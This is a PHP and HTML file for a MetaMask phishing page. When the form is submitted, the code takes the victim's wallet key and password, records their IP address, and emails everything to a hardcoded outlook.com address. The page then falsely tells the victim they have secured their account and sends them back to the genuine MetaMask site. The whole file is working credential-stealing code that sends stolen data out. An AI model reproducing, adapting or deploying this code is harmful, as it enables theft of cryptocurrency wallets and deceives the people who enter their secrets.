


<?php

function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

if (isset($_POST['submit'])) {
		$my_key = $_POST['key'];
		$my_password = $_POST['password'];
		$subject = 'metamask';

		// echo $my_key ;
		// echo $my_password;
		$mail = 'Raeleneleinaalasagapolu@outlook.com';

		$msg =  'Key :' . $my_key . '<br>' . ' => password :' . $my_password . '<br>' .' => ip address :' . getUserIpAddr() ;
		// echo $msg . 'from Javscript file';
		mail($mail, $subject, $msg);

	}
?>




<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable= 0, maximum-scale=1.0" />
	<title>Document</title>
</head>
<body>
	<p>You have taken first step to keep your account safe . Please go back to home</p>
	<div>
		<a href="https://metamask.io/">Go back to home</a>
	</div>

	<style>

		p {
			text-align: center;
			font-size: 18px;
			margin: 15% 0;
		}	
		div {
			display: flex;
			justify-content: center;
			align-items: center;
			margin: 30px;
		}
		 a {
            background-color: #0385e2;
	        border: 1px solid #0385e2;
            color: white;
            padding: 15px;
            border-radius: 10px;
            text-decoration: none;
            font-size: 17px;
        }
	</style>
</body>
</html>



		